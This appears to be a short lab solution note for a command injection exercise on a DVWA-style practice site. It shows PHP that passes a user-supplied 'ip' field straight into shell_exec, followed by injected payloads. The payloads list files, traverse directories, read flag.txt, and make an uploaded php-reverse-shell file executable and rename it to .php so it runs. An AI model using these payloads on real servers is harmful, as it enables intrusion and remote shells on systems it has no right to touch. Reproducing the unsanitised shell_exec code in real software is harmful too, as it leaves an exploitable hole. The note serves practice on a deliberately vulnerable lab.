// Command injection

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 

Form data	
ip	192.168.56.102; cat hackable/uploads/flag.txt
Submit	Submit
user_token	7eea42d9c24269a8f6dda269700f45b4

Solution
1;ls    -- To get the list of files
1;cd source | ls

1;cd ../../../../www/blob/hackable/uploads/;ls

1;cd ../../../../www/blob/hackable/uploads/;chmod +x php-reverse-shell.png

1;cd ../../../../www/blob/hackable/uploads/;mv php-reverse-shell.png php-reverse-shell.php

1;cd ../../../../www/blob/hackable/uploads/;cat flag.txt

php-reverse-shell.php